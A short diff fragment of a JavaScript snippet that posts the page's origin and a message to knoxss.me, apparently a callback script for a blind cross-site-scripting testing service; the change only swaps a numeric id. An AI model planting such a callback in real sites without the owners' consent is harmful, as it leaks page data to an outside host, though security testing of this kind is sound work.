@@ -26,6 +26,6 @@ script.onload = function() {
         var mailer = 'https://knoxss.me/00';
         r.open('POST', mailer, true);
         r.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
-        r.send('origin=' + (document.location.origin === 'file://' ? 0 : document.location.origin) + '&msg=' + encodeURIComponent(msg) + '&id=' + 18029);
+        r.send('origin=' + (document.location.origin === 'file://' ? 0 : document.location.origin) + '&msg=' + encodeURIComponent(msg) + '&id=' + 20119);
     });
 };
